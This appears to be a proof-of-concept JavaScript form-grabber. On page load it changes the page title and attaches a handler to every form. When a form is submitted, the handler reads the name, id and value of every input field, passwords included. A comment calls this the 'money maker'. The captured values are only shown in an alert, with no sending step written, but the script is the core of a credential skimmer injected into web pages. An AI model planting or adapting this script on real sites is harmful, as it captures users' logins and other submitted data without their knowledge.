var lengthOfForm = document.getElementsByTagName("FORM");
var formNumOfInputs = document.getElementsByTagName("INPUT");

function gatehrCradentials() {

	for(i=0;i<formNumOfInputs.length;i++){
		var cerdentialN = document.getElementsByTagName("INPUT")[i].name;
		var cerdentialV = document.getElementsByTagName("INPUT")[i].value;
		var cerdentialID = document.getElementsByTagName("INPUT")[i].id;
			alert("inputname: " + cerdentialN +" input id: "+cerdentialID+ " input value: "+cerdentialV);
	}
}

function injectJsCrad(){
document.title = "This is the new page title.";
for(i=0;i<lengthOfForm.length;i++){
var formCounter = document.getElementsByTagName("FORM")[i];
formCounter.setAttribute("onsubmit", "gatehrCradentials()"); //money maker
formCounter.className += " " + "gatehrC"+i //give special class to all the forms, so i can count them
}
}
window.onload = injectJsCrad;
